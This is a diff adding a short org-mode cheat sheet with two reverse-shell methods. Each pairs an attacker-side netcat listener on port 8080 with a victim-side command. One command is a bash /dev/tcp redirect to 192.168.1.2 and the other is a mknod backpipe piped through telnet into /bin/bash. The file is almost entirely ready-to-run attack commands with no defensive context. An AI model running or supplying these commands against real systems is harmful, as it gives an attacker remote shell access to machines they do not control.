@@ -1,0 +1,27 @@
+#+STARTUP: content
+* bash netcat method 1
+** attacker
+
+#+begin_src sh
+nc -l -n -vv -p 8080
+#+end_src
+
+** victim
+
+#+begin_src sh
+/bin/bash -i > /dev/tcp/192.168.1.2/8080 0<&1 2>&1
+#+end_src
+
+* bash netcat method 2
+
+** attacker
+
+#+begin_src sh
+nc -l -n -vv -p 8080
+#+end_src
+
+** victim
+
+#+begin_src sh
+mknod backpipe p && telnet 192.168.1.2 8080 0<backpipe | /bin/bash 1>backpipe
+#+end_src
